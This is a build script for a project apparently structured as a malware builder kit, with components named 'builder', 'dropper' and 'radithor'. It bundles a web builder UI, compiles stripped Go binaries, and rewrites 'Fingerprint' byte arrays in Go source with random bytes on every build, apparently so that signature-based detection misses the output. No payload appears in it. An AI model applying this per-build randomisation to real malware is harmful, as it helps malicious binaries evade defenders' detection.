import path from 'path';
import fs from 'fs/promises';
import proc from 'process';

import utils from './utils';

const projectItems = [
    'builder',
    'dropper',
    'radithor',
    'runner',
    'shared'
];

const startBuild = performance.now();

const project = {};
project.root = await utils.findDirFromItems(projectItems);

const live = path.join(project.root, '.live');
await fs.mkdir(live, { recursive: true });
project.live = live;

projectItems.forEach((item) => {
    project[item] = path.join(project.root, item);
});

// builder website

await utils.runCommand('bunx', [
    'esbuild',
    path.join(project.builder, 'public', 'js', 'main.js'),
    '--bundle',
    '--format=esm',
    '--minify',
    '--log-level=warning',
    '--outfile=' + path.join(project.live, 'builderscript.js.tmp')
], { stdio: 'ignore' }).catch((err) => {
    console.error('failed to bundle builder site js -', err);
    proc.exit(1);
});

await utils.runCommand('bunx', [
    'esbuild',
    path.join(project.builder, 'public', 'style.css'),
    '--bundle',
    '--format=esm',
    '--minify',
    '--log-level=warning',
    '--outfile=' + path.join(project.live, 'builderstyle.css.tmp')
]).catch((err) => {
    console.error('failed to bundle builder site css -', err);
    proc.exit(1);
});

const builderHtml = await fs.readFile(path.join(
    project.builder,
    'public',
    'index.html'
));

const builderStyle = await fs.readFile(path.join(project.live, 'builderstyle.css.tmp'));
const builderJs = await fs.readFile(path.join(project.live, 'builderscript.js.tmp'));
const builderLayout = await fs.readFile(path.join(project.builder, 'public', 'layout.json'));

const newBuilderHtml = builderHtml
    .toString('utf-8')
    .replace('/* LIVE_BUILDER_CSS */', builderStyle.toString('utf-8'))
    .replace('// LIVE_BUILDER_JS', builderJs.toString('utf-8'))
    // the minification makes the single quotes double
    // inside builder/public/js/site.js
    .replace('"LIVE_BUILDER_SITE_LAYOUT"', JSON.stringify(JSON.parse(builderLayout.toString('utf-8'))));

await fs.writeFile(path.join(project.live, 'builder.html'), newBuilderHtml, 'utf-8').catch((err) => {
    console.error('failed to write builder site file -', err);
    proc.exit(1);
});

await fs.unlink(path.join(project.live, 'builderstyle.css.tmp'));
await fs.unlink(path.join(project.live, 'builderscript.js.tmp'));

console.log('done builder frontend');

// radithor update patch stuff fingerprints

const BYTE_ARRAY_OPEN_PATTERN = /\[\]byte\s*\{/;
const MATCH_ARRAY_PATTERN = /\/\/\s*LIVE_BUILDER_MATCH:([A-Z_]+)/;
const FINGERPRINT_COMMENT_PATTERN = /\/\/\s*Fingerprint\b/;
const HEX_PATTERN = /0x[A-F0-9]{2}/g;

const fingerprintMatches = new Map();

const files = [
    path.join(project.shared, 'constants.go'),
    path.join(project.shared, 'patch', 'radithor.go')
];

files.forEach(async (path) => {
    const data = await fs.readFile(path, 'utf-8');
    const lines = data.split('\n');

    let writeFile = false;

    for (let i = 0; i < lines.length; i++) {
        const code = utils.getCodePart(lines[i]);
        if (!BYTE_ARRAY_OPEN_PATTERN.test(code)) {
            continue;
        }

        let end = -1;
        for (let i2 = i + 1; i2 < lines.length; i2++) {
            const ending = utils
                .getCodePart(lines[i2])
                .trim()
                .startsWith('}');

            if (ending) {
                end = i2;
                break;
            }
        }

        if (end === -1) {
            continue;
        }

        const fingerprints = [];
        let byteCount = 0;

        for (let i2 = i + 1; i2 < lines.length; i2++) {
            if (!FINGERPRINT_COMMENT_PATTERN.test(lines[i2])) {
                continue;
            }

            const hexMatches = utils
                .getCodePart(lines[i2])
                .match(HEX_PATTERN) || [];

            if (hexMatches.length > 0) {
                fingerprints.push(i2);
                byteCount += hexMatches.length;
            }
        }

        if (byteCount === 0) {
            i = end;
            continue;
        }

        const matchName = (lines[i].match(MATCH_ARRAY_PATTERN) || [])[1];
        let bytes;

        if (matchName && fingerprintMatches.has(matchName)) {
            bytes = fingerprintMatches.get(matchName);
            if (bytes.length !== byteCount) {
                i = end;
                continue;
            }
        } else {
            bytes = new Uint8Array(byteCount);
            crypto.getRandomValues(bytes);

            if (matchName) fingerprintMatches.set(matchName, bytes);
        }

        let theByte = 0;
        fingerprints.forEach((thing) => {
            const line = lines[thing];
            const index = line.indexOf('//');
            const code = line
                .slice(0, index)
                .replace(HEX_PATTERN, () => utils.bytesToHexString(bytes[theByte++]));

            lines[thing] = code + line.slice(index);
        });

        writeFile = true;
        i = end;
    };

    if (writeFile) {
        await fs.writeFile(path, lines.join('\n'), 'utf-8');
    }
});

console.log('done patch fingerprints');

// builder backend

await utils.runCommand('go', [
    'build',
    '-o', path.join(project.live, 'builder.exe'),
    '-trimpath',
    '-buildvcs=false',
    '-ldflags=-s -w -buildid=',
    path.join(project.builder, 'main.go')
], {
    cwd: project.builder
}).catch((err) => {
    console.error('failed to build builder server -', err);
    proc.exit(1);
});

console.log('done builder backend');

// radithor gen config mapping

const CONFIG_BLOCK_PATTERN = /const\s*\(\s*\/\/\s*LIVE_BUILDER_CONFIG_IDS/;
const CONFIG_VAR_PATTERN = /^\s*([A-Z_][A-Z_]*)\s+uint8\s*=\s*(\d+)/gm;

const configIdsData = await fs.readFile(path.join(project.radithor, 'store', 'config.go'), 'utf-8');

const configBlock = CONFIG_BLOCK_PATTERN.exec(configIdsData);
const blockStart = configBlock.index + configBlock[0].length;
const blockEnd = configIdsData.indexOf(')', blockStart);
const theBlock = configIdsData.slice(blockStart, blockEnd);

const configMapping = {};

let match = null;
while ((match = CONFIG_VAR_PATTERN.exec(theBlock)) !== null) {
    const [_, name, id] = match;
    const theId = parseInt(id, 10);

    configMapping[name] = theId;
}

await fs.writeFile(
    path.join(project.live, 'radithor.cfgmap.json'),
    JSON.stringify(configMapping), 'utf-8'
).catch((err) => {
    console.error('failed to write radithor config map -', err);
    proc.exit(1);
});

console.log('done radithor config map');

// radithor

await utils.runCommand('go', [
    'build',
    '-o', path.join(project.live, 'radithor.bin'),
    '-trimpath',
    '-buildvcs=false',
    '-ldflags=-s -w -buildid=',
    path.join(project.radithor, 'main.go')
], {
    cwd: project.radithor
}).catch((err) => {
    console.error('failed to build radithor -', err);
    proc.exit(1);
});

console.log('done radithor');
console.log(`build done in ${(performance.now() - startBuild).toFixed(2)}ms!`);
